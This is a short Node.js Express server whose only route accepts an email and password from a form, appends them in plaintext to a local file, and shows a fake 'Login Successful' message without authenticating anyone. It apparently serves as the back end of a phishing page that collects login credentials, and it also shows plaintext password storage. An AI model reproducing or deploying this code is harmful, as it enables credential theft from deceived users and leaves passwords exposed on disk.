const express = require('express');
const fs = require('fs');
const bodyParser = require('body-parser');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));

app.post('/save', (req, res) => {
    const { email, password } = req.body;
    const data = `Email: ${email}, Password: ${password}\n`;
    fs.appendFileSync('data.txt', data);
    res.send('<h1>Login Successful</h1><p>Your data has been saved.</p>');
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
